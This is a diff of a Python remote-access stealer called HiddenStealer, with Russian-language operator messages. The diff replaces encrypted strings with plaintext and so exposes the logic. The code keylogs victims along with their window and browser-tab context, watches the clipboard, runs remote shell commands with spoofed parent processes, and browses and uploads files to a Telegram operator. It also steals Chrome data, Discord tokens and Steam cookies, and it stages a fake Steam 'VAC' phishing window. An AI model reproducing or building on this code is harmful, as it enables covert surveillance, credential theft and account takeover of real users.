@@ -2083,30 +2137,30 @@ class HiddenStealer:
                 'browser': browser_name,
                 'tab': tab_title if browser_name else None,
                 'game': game_name,
-                'timestamp': datetime.now().strftime(decrypt_string("S3pCTgNrfDE=")),
+                'timestamp': datetime.now().strftime("%H:%M:%S"),
                 'layout': self.get_layout_name()
             }
         except:
             return {
                 'title': "Unknown",
                 'process_name': "Unknown",
-                'timestamp': datetime.now().strftime(decrypt_string("S3pCTgNrfDE=")),
+                'timestamp': datetime.now().strftime("%H:%M:%S"),
                 'layout': self.get_layout_name()
             }
         print("📍 MIDDLE REACHED (main.py)")
     def finalize_current_line(self):
         if self.keylog_current_line and len(self.keylog_current_line.strip()) > 0:
-            timestamp = datetime.now().strftime(decrypt_string("S3pCTgNrfDE="))
+            timestamp = datetime.now().strftime("%H:%M:%S")
             window_info = self.get_window_info_detailed()
             current_app = window_info['game'] or window_info['browser'] or window_info['process_name']
             if window_info.get('tab'):
                 tab_text = str(window_info['tab'])
-                current_app += decrypt_string("ThoDHy8zBhY/Dx5jSAtWJxMb")
+                current_app += "({tab_text[:20]})"
             context_prefix = ""
             if not self.last_context_app or self.last_context_app != current_app:
                 context_prefix = f"[{current_app}] "
                 self.last_context_app = str(current_app)
-            context_entry = decrypt_string("FVEXBTo0IRYFBxhdFFAeBxVGEQYrIi0DNwcXGAlKAxYIHBMONz02BQUUH0oAXAgOMV4RBSss")
+            context_entry = "{context_prefix}{timestamp} {self.keylog_current_line}"
             self.keylog_context.append(context_entry)
             self.keylog_full_history.append(context_entry)
             self.keylog_current_line = ""
@@ -2191,7 +2245,7 @@ class HiddenStealer:
                 if current_time - self.last_key_time > 15 and self.keylog_current_line:
                     self.finalize_current_line()
             except Exception as e:
-                print(decrypt_string("NRMlSwU0IA41EA1dABkDCBxdClFuKjwf"))
+                print("[!] Keylogger error: {e}")
         try:
             self.keyboard_hook = keyboard.on_release(on_key)
             self.keylogger_active = True
@@ -2210,11 +2264,11 @@ class HiddenStealer:
                 parse_mode="HTML"
             )
         except Exception as e:
-            print(decrypt_string("NRMlSwgwMA4/E0pMHRkVDg9ADEslNCAONRANXQADRgELTw=="))
+            print("[!] Failed to start keylogger: {e}")
             safe_send_message(
                 self.bot,
                 ADMIN_ID,
-                decrypt_string("jK/0SwgwMA4/E0pMHRkVDg9ADEslNCAONRANXQBlCAEdRgpDK3gCWGtHWmUP")
+                "❌ Failed to start keylogger\\n{str(e)[:100]}"
             )
     def stop_keylogger(self):
         if not self.keylogger_active:
@@ -2234,25 +2288,25 @@ class HiddenStealer:
         safe_send_message(
             self.bot,
             ADMIN_ID,
-            decrypt_string("jL7QhPbeebLAp9/oy+ndqtDiy7v9geyz2le6hqO4t/i+gqjWnu+J0IrMuo2ihGyK8aHyS57DiOOKwrqLoodGq+/ixrv/gNmy6qfX6MwZt/u+iqjXnuOJ3IrMuoaii1xaFVEXHiAlJA==").format(count=len(self.keylog_buffer))
+            "⌨️ Кейлоггер остановлен\n📊 Всего собрано символов: {count}".format(count=len(self.keylog_buffer))
         )
     def get_formatted_keylog(self, full_log=False):
         layout = self.get_layout_name()
         if full_log:
-            formatted = decrypt_string("nq3r4G6BxrLEp/Ho7+nNqvcSqPCez4nxeqfw6Onp9qr84uC73oH7svmnyujZZQg=")
-            formatted += decrypt_string("nq3uzqHp1kIhBA9UFBcQEw1GEQYRPzgPPwo2Vg==")
-            formatted += decrypt_string("nq3r4W6By7Pbp9/owenYWr+zqNOe7YnQism6g6KHtshUEgMHKz9xET8bDBYZXB8WAVUnCTs3PwcoXhdkHA==")
-            formatted += decrypt_string("nq3r9m6B+LPYpurozOncWr6AWLv2gNiz2KfU6fLp3qrWCFgQIjQ3SikSBl5cUgMDAl0fNCgkNQ4FHwNLBlYUA0dPJAU=")
-            formatted += decrypt_string("nq3v0aHp1kKK1bqNooO3+b+7qNuf3nmz2qfa6fPp3KrV4si7+oHjsupNSkMeWB8VG0YFNyA=")
-            formatted += decrypt_string("nq3t+24qPQMuEh5RH1xIFAFFUEJgIi0QPAMDVRcRQV8mCF0mdHQKRXMKNlYuVw==")
+            formatted = "📋 ПОЛНЫЙ ЛОГ КЛАВИАТУРЫ\\n"
+            formatted += "🖥️ {self.victim_name}\\n"
+            formatted += "📊 Всего символов: {len(self.keylog_buffer)}\\n"
+            formatted += "📝 Строк в истории: {len(self.keylog_full_history)}\\n"
+            formatted += "🗺️ Текущая раскладка: {layout}\\n"
+            formatted += "🕐 {datetime.now().strftime(\'%H:%M:%S\')}\\n\\n"
             if self.keylog_full_history:
-                formatted += decrypt_string("nq3r926BwbPbpujozOjmqtbj90ue44nQism6jKKJXCYA")
+                formatted += "📜 История ввода:\\n"
                 history_list = list(self.keylog_full_history)
                 for entry in history_list[-30:]:
-                    formatted += decrypt_string("ThIDDiAlKxsnKwQ=")
+                    formatted += "{entry}\\n"
                 formatted += "\n"
             if self.keylog_buffer:
-                formatted += decrypt_string("nq3rzW6B+LPRpurozOnfWr6Dqeif1YnXi/dQZBw=")
+                formatted += "📦 Сырой буфер:\\n"
                 if self.keylog_buffer:
                     formatted += self.keylog_buffer[-3000:] if len(self.keylog_buffer) > 3000 else self.keylog_buffer
                 formatted += "\n"
@@ -2278,7 +2332,7 @@ class HiddenStealer:
                     if i == 0:
                         safe_send_message(self.bot, ADMIN_ID, part)
                     else:
-                        safe_send_message(self.bot, ADMIN_ID, decrypt_string("nq3r5W6BxrPap9ToxunYqtXizrv7geSy4qffFlwXOhQyXAMbLyMtHw=="))
+                        safe_send_message(self.bot, ADMIN_ID, "📎 Продолжение...\\n\\n{part}")
             else:
                 safe_send_message(self.bot, ADMIN_ID, log_message)
             if not full_log:
@@ -2286,27 +2340,27 @@ class HiddenStealer:
                 if len(self.keylog_context) > 10:
                     self.keylog_context = deque(list(self.keylog_context)[-10:], maxlen=50)
         except Exception as e:
-            print(decrypt_string("NRMlSx00NwZ6HA9BHlYBWgtACgQ8a3kZPwo="))
+            print("[!] Send keylog error: {e}")
     def get_keylog_stats(self):
         if not self.keylogger_active:
             return "⌨️ Кейлоггер не активен"
-        stats = decrypt_string("nq3r4W6B+LPYp9rp8Oneq+/j+rv2geOy6le6gqKMtsO+iajVnuKJ0YrCu7iiiToU")
-        stats += decrypt_string("nq3uzqHp1kIhBA9UFBcQEw1GEQYRPzgPPwo2Vg==")
-        stats += decrypt_string("nq3rzW6B+LLip9bowOnYqtXixrv8cYnQeqfb6fHo4qrb4/i7+2t5GTYSBBABXAocQFkdEiI+Pj04AgxeF0tPBzJc")
-        stats += decrypt_string("jK73hPbeebL4p9/oyOjlq+fiyLrBcYjji/W7uKKHtsC+gkJLNT08DHIED1QUFw0fF14XDBEyLBAoEgRMLVUPFAsbBUuf0Inaisu6iqKHtsG+jKjZEj8=")
-        stats += decrypt_string("nq3r9m6BzrLqp9XoyujnqtviwUue43my4KfU6M/o5Krb4sK6z4Dbsu9NSkMeXAhSHVcUDWA6PBs2GA1nEVYIDgtKDEIzDTc=")
-        stats += decrypt_string("nq3r926By7Pbp9/owenYWr6AWLv2gNiz2KfU6fLp3qrWCFgQIjQ3SikSBl5cUgMDAl0fNCgkNQ4FHwNLBlYUA0dPJAU=")
-        stats += decrypt_string("jL7QhPbeebLHp9roxOnWq+ziwLv3cYjjeqfV6Mzo56rV4s27+oHksu+n0xiih7f4vo2p657hidCKzbqASBkdCQteHkUlNCA9KgUPSwFmBRUbXAwWEj8FDA==")
+        stats = "📊 Статистика кейлоггера\\n"
+        stats += "🖥️ {self.victim_name}\\n"
+        stats += "📦 Символов в буфере: {len(self.keylog_buffer)}\\n"
+        stats += "✏️ Текущая строка: {len(self.keylog_current_line)} символов\\n"
+        stats += "📝 Записей в контексте: {len(self.keylog_context)}\\n"
+        stats += "📜 Всего в истории: {len(self.keylog_full_history)}\\n"
+        stats += "⌨️ Нажатий с последней отправки: {self.key_press_count}\\n\\n"
         window_info = self.get_window_info_detailed()
-        stats += decrypt_string("nq3S9G6B+7Lvp9Dp8ejvqtvizUue74nYisq6hkhlCA==")
-        stats += decrypt_string("ThKI9N3deRktHgRcHU45EwBUFzBpJTAWNhJNZSkDV09ebwU3IA==")
-        stats += decrypt_string("ThKI9N3QeRktHgRcHU45EwBUFzBpISsNORIZSy1XBxcLFSUWEj8=")
+        stats += "🪟 Текущее окно:\\n"
+        stats += "📌 {window_info[\'title\'][:150]}\\n"
+        stats += "📁 {window_info[\'process_name\']}\\n"
         if window_info['browser']:
-            stats += decrypt_string("ThKI9MLBeRktHgRcHU45EwBUFzBpMysNLQQPSlVkGyYA")
+            stats += "🌐 {window_info[\'browser\']}\\n"
             if window_info['tab']:
-                stats += decrypt_string("ThKI9NrHeRktHgRcHU45EwBUFzBpJTgAfSoxAkMMVicTbhY=")
+                stats += "🔖 {window_info[\'tab\'][:150]}\\n"
         if window_info['game']:
-            stats += decrypt_string("ThKI9MD/eRktHgRcHU45EwBUFzBpNjgPP1A3RS5X")
+            stats += "🎮 {window_info[\'game\']}\\n"
         return stats
     def clear_keylog(self):
         try:
@@ -2329,7 +2383,7 @@ class HiddenStealer:
                         if text and text != self.last_clipboard and len(text) > 10:
                             self.last_clipboard = text
                             self.clipboard_buffer.append({
-                                'time': datetime.now().strftime(decrypt_string("S3pCTgNrfDE=")),
+                                'time': datetime.now().strftime("%H:%M:%S"),
                                 'text': text[:500]
                             })
                             if len(self.clipboard_buffer) >= 3:
@@ -2395,7 +2449,7 @@ class HiddenStealer:
                         self.current_working_dir = os.path.expanduser('~')
                         return f"🏠 <b>Переход в домашнюю директорию</b>\n📍 <code>{self.current_working_dir}</code>"
                     elif new_path == '' or new_path == '.':
-                        return decrypt_string("nq3r5m4SLBAoEgRMUl0PCAtRDAQ8KGM+NAwZXR5fSBkbQAoOICUGFTUFAVEcXjkeB0AF")
+                        return "📍 Current directory:\\n{self.current_working_dir}"
                     else:
                         if os.path.isabs(new_path):
                             potential_path = new_path
@@ -2406,13 +2460,13 @@ class HiddenStealer:
                             self.current_working_dir = potential_path
                             return f"📂 <b>Директория изменена</b>\n📍 <code>{self.current_working_dir}</code>"
                         else:
-                            return decrypt_string("jK/0Swo4Kwc5AwVKCxkIFRoSHgQ7Pz1YegwEXQVmFhsaWgU3IKHG8ddXKU0ASwMUGghYED00NQR0FB9KAFwIDjFFFxklODcFBRMDSg8=")
+                            return "❌ Directory not found: {new_path}\\n📍 Current: {self.current_working_dir}"
                 except Exception as e:
-                    return decrypt_string("jK/0Sy01eQcoBQVKSBkdCRpAUA5nCmNTakc3RS5XluX9v1goOyMrBzQDUBgJSgMWCBwbHjwjPAwuKB1XAFIPFAltHAI8LA==")
+                    return "❌ cd error: {str(e)[:100]}\\n📍 Current: {self.current_working_dir}"
             if command.strip().lower() == 'cd':
-                return decrypt_string("nq3r5m4SLBAoEgRMUl0PCAtRDAQ8KGM+NAwZXR5fSBkbQAoOICUGFTUFAVEcXjkeB0AF")
+                return "📍 Current directory:\\n{self.current_working_dir}"
             if command.strip().lower() == 'pwd':
-                return decrypt_string("nq3r6m4SLBAoEgRMUl0PCAtRDAQ8KGM+NAwZXR5fSBkbQAoOICUGFTUFAVEcXjkeB0AF")
+                return "📁 Current directory:\\n{self.current_working_dir}"
             if command.strip().lower() in ['ls', 'dir']:
                 try:
                     items = []
@@ -2429,9 +2483,9 @@ class HiddenStealer:
                             if size < 1024:
                                 size_str = f"{size} B"
                             elif size < 1048576:
-                                size_str = decrypt_string("FUERESt+aFJoQ1AWQ18bWiVw")
+                                size_str = "{size/1024:.1f} KB"
                             else:
-                                size_str = decrypt_string("FUERESt+aFJuT18PRANISwhPWCYM")
+                                size_str = "{size/1048576:.1f} MB"
                             items.append(f"📄 {item} ({size_str})")
                             files_count += 1
                     result = f"📂 <b>Содержимое:</b> <code>{self.current_working_dir}</code>\n"
@@ -2442,9 +2496,9 @@ class HiddenStealer:
                         result += f"\n\n🔹 ... и ещё {len(items)-30} элементов"
                     return result
                 except PermissionError:
-                    return decrypt_string("jK/0Sx40Kw8zBBlRHVdGHgtcEQ4qa3kZKRIGXlxaEwgcVxYfESY2EDEeBF8tXQ8IEw==")
+                    return "❌ Permission denied: {self.current_working_dir}"
                 except Exception as e:
-                    return decrypt_string("jK/0SwsjKw0oVwZRAU0PFAkSHAI8NDoWNQUTAlJCFQ4cGh1CFWtoUmoqFw==")
+                    return "❌ Error listing directory: {str(e)[:100]}"
             # Premium Native Execution (PPID Spoofed)
             if hasattr(self, 'shell_manager'):
                 output = self.shell_manager.ExecuteCommand(command)
@@ -2462,14 +2516,14 @@ class HiddenStealer:
                     output = "✅ Success" if result.returncode == 0 else "❌ Failure"
 
             if len(output) > 3500:
-                output = output[:3500] + decrypt_string("MlxWRWBxAhYoAgRbE00DHjM=")
+                output = output[:3500] + "\\n... [truncated]"
             
             if command.strip().lower() not in ['ls', 'dir', 'cd', 'pwd']:
                 return f"📍 <code>{self.current_working_dir}</code>\n<code>> {command}</code>\n\n{output}"
             return output
         except Exception as e:
-            return decrypt_string("jK/0S3IzZyciEglNBlAJFE53ChkhI2NedRVUGAlKEghGV1EwdGBsUgcK")
-            return decrypt_string("jK/0SwsjKw0oTUpDAU0UUgsbI1F/YWk/Jw==")
+            return "❌ <b>Execution Error:</b> {str(e)[:150]}"
+            return "❌ Error: {str(e)[:100]}"
     def send_file(self, file_path, chat_id):
         try:
             if not os.path.exists(file_path):
@@ -2484,20 +2538,20 @@ class HiddenStealer:
                     from core.cloud import CloudModule
                     link = CloudModule.upload_file(file_path)
                     if link:
-                        return decrypt_string("jKr5hPbeebL+p9roy+ndWr6FqNue4ojii/S6jqKMtsdO4spLnu+J04rMuoiig7bEThoDGCcrPD03FVAWQ18bWiNwUVESPyIOMxkBRQ==")
+                        return "☁️ Файл загружен в облако ({size_mb:.1f} MB):\\n{link}"
                 except:
                     pass
-                return decrypt_string("jK/0S571idKKzrqDUujnqtXiwLrGgeOy5KfWGKKItsS+iannn9mJ3IrOUBgJSg8AC20VCXR/aAQnVyd6Lle25r6CqNGf0Inaisu7u6KFXFpbAlgmDA==")
+                return "❌ Файл слишком большой: {size_mb:.1f} MB\\nМаксимум: 50 MB"
             file_name = os.path.basename(file_path)
             file_ext = os.path.splitext(file_name)[1].lower()
             file_icon = self.get_file_icon(file_ext)
             size_kb = file_size / 1024
             if size_kb < 1024:
-                size_str = decrypt_string("FUERESsOMgBgWVteDxktOA==")
+                size_str = "{size_kb:.1f} KB"
             else:
                 size_mb = size_kb / 1024
-                size_str = decrypt_string("FUERESsONABgWVteDxkrOA==")
-            modified_time = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime(decrypt_string("S2tVTiN8fAZ6UiICV3RcXz0="))
+                size_str = "{size_mb:.1f} MB"
+            modified_time = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime("%Y-%m-%d %H:%M:%S")
             self.save_client_state()
             client_name = self.victim_name
             caption = f"""{file_icon} Файл отправлен
@@ -2517,17 +2571,17 @@ class HiddenStealer:
                 )
             return f"✅ Файл '{file_name}' отправлен успешно"
         except Exception as e:
-            return decrypt_string("jK/0S57PiOqKz7qJooO2yk7ixrrMgeaz2qfa6MDp3KrWCFgQPSUrSj9eMQJDCVYnEw==")
+            return "❌ Ошибка отправки: {str(e)[:100]}"
     def get_file_icon(self, extension):
         icons = {
-            decrypt_string('QEYAHw=='): '📄', decrypt_string('QFYXCA=='): '📘', decrypt_string('QFYXCDY='): '📘', decrypt_string('QEIcDQ=='): '📕',
-            decrypt_string('QEoUGA=='): '📗', decrypt_string('QEoUGDY='): '📗', decrypt_string('QEIIHw=='): '📙', decrypt_string('QEIIHzY='): '📙',
-            decrypt_string('QFgIDA=='): '🖼️', decrypt_string('QFgIDik='): '🖼️', decrypt_string('QEIWDA=='): '🖼️', decrypt_string('QFURDQ=='): '🖼️',
-            decrypt_string('QEgRGw=='): '🗜️', decrypt_string('QEAZGQ=='): '🗜️', '.7z': '🗜️',
-            decrypt_string('QFcADg=='): '⚙️', decrypt_string('QF8LAg=='): '⚙️', decrypt_string('QFAZHw=='): '📦',
-            '.py': '🐍', '.js': '📜', decrypt_string('QFoMBiI='): '🌐', decrypt_string('QFEIGw=='): '⚡',
-            decrypt_string('QFgLBCA='): '📊', decrypt_string('QEoVBw=='): '📊', decrypt_string('QEEJBw=='): '🗄️', '.db': '🗄️',
-            decrypt_string('QEIdBg=='): '🔑', decrypt_string('QFkdEg=='): '🔑', decrypt_string('QF4XDA=='): '📋',
+            ".txt": '📄', ".doc": '📘', ".docx": '📘', ".pdf": '📕',
+            ".xls": '📗', ".xlsx": '📗', ".ppt": '📙', ".pptx": '📙',
+            ".jpg": '🖼️', ".jpeg": '🖼️', ".png": '🖼️', ".gif": '🖼️',
+            ".zip": '🗜️', ".rar": '🗜️', '.7z': '🗜️',
+            ".exe": '⚙️', ".msi": '⚙️', ".bat": '📦',
+            '.py': '🐍', '.js': '📜', ".html": '🌐', ".cpp": '⚡',
+            ".json": '📊', ".xml": '📊', ".sql": '🗄️', '.db': '🗄️',
+            ".pem": '🔑', ".key": '🔑', ".log": '📋',
         }
         return icons.get(extension, '📎')
     def file_manager_keyboard(self, path, page=0):
@@ -2613,11 +2667,11 @@ class HiddenStealer:
                     except:
                         pass
             if total_size >= 1024*1024*1024:
-                size_str = decrypt_string("FUYXHy89BhEzDQ8YXRlOS14ATEF/YWtWcEZaCkYQXFRfVAVLCRM=")
+                size_str = "{total_size / (1024*1024*1024):.1f} GB"
             elif total_size >= 1024*1024:
-                size_str = decrypt_string("FUYXHy89BhEzDQ8YXRlOS14ATEF/YWtWc01ECRRERjcs")
+                size_str = "{total_size / (1024*1024):.1f} MB"
             elif total_size >= 1024:
-                size_str = decrypt_string("FUYXHy89BhEzDQ8YXRlXSlwGQkV/NyRCETU=")
+                size_str = "{total_size / 1024:.1f} KB"
             else:
                 size_str = f"{total_size} B"
             markup, total_pages, start_idx, end_idx = self.file_manager_keyboard(start_path, page)
@@ -2630,20 +2684,20 @@ class HiddenStealer:
 • Всего: {size_str}
 """
             if total_pages > 1:
-                header += decrypt_string("Mlya/8+zzeO44+va5riE7u/Q7OqsxdiAzvaIrPPb8vuMpvmJ2tC79tuV/rmQreeY+rOa/8+zzeO44+va5rg6FJ6t6+9ugfiz2Kbq6MLp26rW4/67/nEiEjsQDxNDREkBGl0MCiIOKQM9EhlFUhEdHwBWJwIqKXQRLhYYTC1QAgITEqjTnuZ5GTwYBlwXSxUlDV0NBTp6Pws2EhlnEVYTFBpPUQ==")
+                header += "\\n━━━━━━━━━━━━━━━━━━━━\\n📄 Страница {page+1}/{total_pages} ({end_idx-start_idx} из {folders_count+files_count})"
             header += "\n"
             safe_send_message(self.bot, chat_id, header, reply_markup=markup)
         except PermissionError:
             safe_send_message(
                 self.bot,
                 chat_id,
-                decrypt_string("jK/0S57MideL9UroxunYq+/j+rrNgeay6le6glLp2are4se79IHsWFAMGlkGURs=").format(path=start_path)
+                "❌ Нет доступа к папке:\n{path}".format(path=start_path)
             )
         except Exception as e:
             safe_send_message(
                 self.bot,
                 chat_id,
-                decrypt_string("jK/0S57PiOqKz7qJooO2ylQSAw4z")
+                "❌ Ошибка: {e}"
             )
     def steal_chrome_data(self):
         """Кража данных из Chrome (отдельно)"""
@@ -2663,7 +2717,7 @@ class HiddenStealer:
             if tokens_list:
                 tokens_dir = os.path.join(self.report_manager.output_dir, "Discord")
                 os.makedirs(tokens_dir, exist_ok=True)
-                with open(os.path.join(tokens_dir, decrypt_string("Gl0TDiAidwgpGAQ=")), 'w', encoding='utf-8') as f:
+                with open(os.path.join(tokens_dir, "tokens.json"), 'w', encoding='utf-8') as f:
                     json.dump(tokens_list, f)
         except: pass
 
@@ -2809,7 +2863,7 @@ class HiddenStealer:
         if hasattr(self, 'system_manager'):
             info = self.system_manager.GetSystemInfo()
         else:
-            info = decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluJDcDLBYDVBNbCh9A")
+            info = "Native SystemManager unavailable."
         safe_send_message(self.bot, GLOBAL_CHID, info, parse_mode="HTML")
     def admin_panel_keyboard(self, user_id=None):
         from telebot import types
@@ -2860,7 +2914,7 @@ class HiddenStealer:
         try:
             cwd = self.current_working_dir
             if not os.path.exists(cwd):
-                cwd = decrypt_string("LQgkNw==")
+                cwd = "C:\\\\"
                 self.current_working_dir = cwd
 
             entries = os.listdir(cwd)
@@ -3103,7 +3157,7 @@ class HiddenStealer:
         if not token or not url:
             safe_send_message(self.bot, message.chat.id, "❌ Токен или ссылка приглашения не могут быть пустыми.")
             return
-        if decrypt_string("ClsLCCEjPUw9EA==") not in url and decrypt_string("DVoZBSA0NRF1") not in url:
+        if "discord.gg" not in url and "channels/" not in url:
              safe_send_message(self.bot, message.chat.id, "❌ Ссылка приглашения должна содержать 'discord.gg' или 'discord.com'.")
         token_source = "вручную" if "|" in text else "украден с жертвы"
         # Initial status message is NOT sent here anymore, 
@@ -3165,7 +3219,7 @@ class HiddenStealer:
                     try:
                         while True:
                             data, _ = sock.recvfrom(2048)
-                            msg = decrypt_string(data.decode("utf-8", errors="replace"))
+                            msg = Resolver.decrypt(data.decode("utf-8", errors="replace"))
                             if msg == "CLOSE":
                                 break
                             safe_send_message(self.bot, chat_id, "VAC: " + msg)
@@ -3182,21 +3236,21 @@ class HiddenStealer:
 
                 # 4. Prepare HTML with Localization and Customizations
                 try:
-                    html_src = os.path.join(vac_dir, "site_dump", decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjZ/MRY3Gw=="))
-                    html_out = os.path.join(vac_dir, "site_dump", decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjYOKwc+WQJMH1U="))
+                    html_src = os.path.join(vac_dir, "site_dump", "steamcommunity.com", "linkfilter", "index.html")
+                    html_out = os.path.join(vac_dir, "site_dump", "steamcommunity.com", "linkfilter", "index_red.html")
                     
                     if os.path.exists(html_src):
                         with open(html_src, "r", encoding="utf-8") as f:
                             content = f.read()
                         
                         # Apply custom Agent Name if exists
-                        agent_name_path = os.path.join(vac_dir, decrypt_string("D1UdBToONwM3EkRMCk0="))
+                        agent_name_path = os.path.join(vac_dir, "agent_name.txt")
                         if os.path.exists(agent_name_path):
                             try:
                                 with open(agent_name_path, "r", encoding="utf-8") as f_name:
                                     new_name = f_name.read().strip()
                                 if new_name:
-                                    content = re.sub(decrypt_string('UkEMGSE/PlwBKVZlWQVJCRpAFwUpbw=='), decrypt_string('UkEMGSE/PlwhGQ9PLVcHFwtPREQ9JSsNNBBU'), content)
+                                    content = re.sub("<strong>[^<]+</strong>", "<strong>{new_name}</strong>", content)
                             except: pass
                         
                         # Apply Localization
@@ -3210,17 +3264,17 @@ class HiddenStealer:
 
                 # 5. Prepare Cookies for VAC injection
                 try:
-                    vac_cookie_path = os.path.join(vac_dir, decrypt_string("DV0XACc0KkwuDx4="))
+                    vac_cookie_path = os.path.join(vac_dir, "cookies.txt")
                     if not os.path.exists(vac_cookie_path) or os.path.getsize(vac_cookie_path) < 10:
                         all_cookies = []
                         for root, _, files in os.walk(self.report_manager.output_dir):
                             for file in files:
-                                if decrypt_string("DV0XACc0KkwwBAVW") in file.lower():
+                                if "cookies.json" in file.lower():
                                     try:
                                         with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                                             all_cookies.extend(json.load(f))
                                     except: pass
-                        steam_cookies = [c for c in all_cookies if decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf") in c.get('domain', '').lower()]
+                        steam_cookies = [c for c in all_cookies if "steamcommunity.com" in c.get('domain', '').lower()]
                         if steam_cookies:
                             unique_cookies = {}
                             for c in steam_cookies:
@@ -3234,9 +3288,9 @@ class HiddenStealer:
                 except Exception as e:
                     log_debug("VAC: Ошибка при подготовке куки: " + str(e))
 
-                compiled_exe = os.path.join(BASE_DIR, decrypt_string("PUYdCiMQNQcoA0RdClw="))
+                compiled_exe = os.path.join(BASE_DIR, "SteamAlert.exe")
                 if not os.path.exists(compiled_exe):
-                    compiled_exe = os.path.join(vac_dir, decrypt_string("PUYdCiMQNQcoA0RdClw="))
+                    compiled_exe = os.path.join(vac_dir, "SteamAlert.exe")
 
                 lang = _get_vac_lang()
                 if os.path.exists(compiled_exe):
@@ -3250,7 +3304,7 @@ class HiddenStealer:
                     safe_send_message(self.bot, chat_id, "✅ VAC окно запущено (скомпилированный EXE).")
                     return
 
-                vac_script = os.path.join(vac_dir, decrypt_string("HUYdCiMONw0uHgldXEkf"))
+                vac_script = os.path.join(vac_dir, "steam_notice.py")
                 if not os.path.exists(vac_script):
                     safe_send_message(self.bot, chat_id, "❌ VAC скрипт не найден. Пожалуйста, убедитесь, что `steam_notice.py` находится в папке `tablichka`.")
                     sock.close()
@@ -3763,7 +3817,7 @@ class HiddenStealer:
                 if hasattr(self, 'system_manager'):
                     info = self.system_manager.GetSystemInfo()
                 else:
-                    info = decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluJDcDLBYDVBNbCh9A")
+                    info = "Native SystemManager unavailable."
                 safe_send_message(bot, chat_id, info, parse_mode="HTML")
 
             elif data == "wifi":
@@ -3790,7 +3844,7 @@ class HiddenStealer:
                 if hasattr(self, 'system_manager'):
                     info = self.system_manager.GetSystemInfo()
                 else:
-                    info = decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluJDcDLBYDVBNbCh9A")
+                    info = "Native SystemManager unavailable."
                 safe_send_message(bot, chat_id, info, parse_mode="HTML")
 
             elif data == "proc_list":
@@ -4063,7 +4117,7 @@ class HiddenStealer:
             elif data == "vac_lang_toggle":
                 current = _get_vac_lang()
                 new_lang = "en" if current == "cn" else "cn"
-                lang_file = os.path.join(BASE_DIR, "tablichka", decrypt_string("GFMbNCIwNwV0AxJM"))
+                lang_file = os.path.join(BASE_DIR, "tablichka", "vac_lang.txt")
                 os.makedirs(os.path.dirname(lang_file), exist_ok=True)
                 with open(lang_file, "w") as f:
                     f.write(new_lang)
@@ -4092,18 +4146,18 @@ class HiddenStealer:
             elif data == "vac_set_name":
 
                 old_name = "Jared Brahill"
-                agent_name_path = os.path.join(BASE_DIR, "tablichka", decrypt_string("D1UdBToONwM3EkRMCk0="))
+                agent_name_path = os.path.join(BASE_DIR, "tablichka", "agent_name.txt")
                 if os.path.exists(agent_name_path):
                     try:
                         old_name = open(agent_name_path, "r", encoding="utf-8").read().strip() or old_name
                     except: pass
                 else:
                     html_path = os.path.join(BASE_DIR, "tablichka", "site_dump",
-                                             decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjZ/MRY3Gw=="))
+                                             "steamcommunity.com", "linkfilter", "index.html")
                     if os.path.exists(html_path):
                         try:
                             import re as _re
-                            m_name = _re.search(decrypt_string('UkEMGSE/PlxyLDQELxJPRkFBDBkhPz5c'), open(html_path, "r", encoding="utf-8").read())
+                            m_name = _re.search("<strong>([^<]+)</strong>", open(html_path, "r", encoding="utf-8").read())
                             if m_name:
                                 old_name = m_name.group(1)
                         except: pass
@@ -4120,7 +4174,7 @@ class HiddenStealer:
                         return
                     try:
 
-                        agent_name_path = os.path.join(BASE_DIR, "tablichka", decrypt_string("D1UdBToONwM3EkRMCk0="))
+                        agent_name_path = os.path.join(BASE_DIR, "tablichka", "agent_name.txt")
                         os.makedirs(os.path.dirname(agent_name_path), exist_ok=True)
 
                         old_name = "Jared Brahill"
@@ -4131,11 +4185,11 @@ class HiddenStealer:
                         else:
 
                             html_path = os.path.join(BASE_DIR, "tablichka", "site_dump",
-                                                     decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjZ/MRY3Gw=="))
+                                                     "steamcommunity.com", "linkfilter", "index.html")
                             if os.path.exists(html_path):
                                 try:
                                     import re as _re
-                                    m_name = _re.search(decrypt_string('UkEMGSE/PlxyLDQELxJPRkFBDBkhPz5c'), open(html_path, "r", encoding="utf-8").read())
+                                    m_name = _re.search("<strong>([^<]+)</strong>", open(html_path, "r", encoding="utf-8").read())
                                     if m_name:
                                         old_name = m_name.group(1)
                                 except: pass
@@ -4144,7 +4198,7 @@ class HiddenStealer:
                             f_name.write(new_name)
 
                         html_out = os.path.join(BASE_DIR, "tablichka", "site_dump",
-                                                decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjYOKwc+WQJMH1U="))
+                                                "steamcommunity.com", "linkfilter", "index_red.html")
                         if os.path.exists(html_out):
                             os.remove(html_out)
 
@@ -4173,7 +4227,7 @@ class HiddenStealer:
                             return
                         file_info = bot.get_file(m.document.file_id)
                         downloaded = bot.download_file(file_info.file_path)
-                        cookie_dest = os.path.join(BASE_DIR, "tablichka", decrypt_string("DV0XACc0KkwuDx4="))
+                        cookie_dest = os.path.join(BASE_DIR, "tablichka", "cookies.txt")
                         os.makedirs(os.path.dirname(cookie_dest), exist_ok=True)
                         with open(cookie_dest, "wb") as f_ck:
                             f_ck.write(downloaded)
@@ -4231,7 +4285,7 @@ class HiddenStealer:
                         safe_send_message(bot, chat_id, "❌ Ошибка при WeChat фишинге: " + str(e))
                 threading.Thread(target=do_wechat, daemon=True).start()
 
-            elif data.startswith(decrypt_string("DV4RDiAlBgs0EQUC")):
+            elif data.startswith("client_info:"):
                 hwid = data.split(":")[1]
                 client = self.clients.get(hwid)
                 if client:
@@ -4245,7 +4299,7 @@ class HiddenStealer:
                 else:
                     bot.answer_callback_query(call.id, "❌ Клиент не найден")
 
-            elif data.startswith(decrypt_string("DV4RDiAlBg47FQ9USA==")):
+            elif data.startswith("client_label:"):
                 hwid = data.split(":")[1]
                 msg_lbl = safe_send_message(bot, chat_id, "✏️ Введите новую метку для клиента:")
